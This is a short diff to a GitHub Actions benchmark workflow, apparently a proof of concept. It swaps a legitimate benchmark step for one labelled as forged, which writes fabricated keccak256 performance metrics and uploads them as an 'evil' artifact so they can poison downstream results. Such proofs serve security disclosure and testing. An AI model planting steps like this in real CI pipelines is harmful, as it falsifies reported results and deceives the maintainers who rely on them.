@@ -14,6 +14,13 @@ jobs:
   bench:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: Legit non-rust bench
-        run: echo "real non-rust benchmark run"
+      - name: Forged "non-rust benchmark" producing attacker-controlled artifacts
+        run: |
+          mkdir -p evil
+          cat > evil/forged_metrics.json <<'JSON'
+          {"name":"forge","feat":null,"target":"keccak256","input_size":2,"proof_duration":2,"verify_duration":2,"cycles":2,"proof_size":2,"preprocessing_size":2,"num_constraints":2,"peak_memory":2}
+          JSON
+      - uses: actions/upload-artifact@v4
+        with:
+          name: benchmark-outputs-evil
+          path: evil/forged_metrics.json
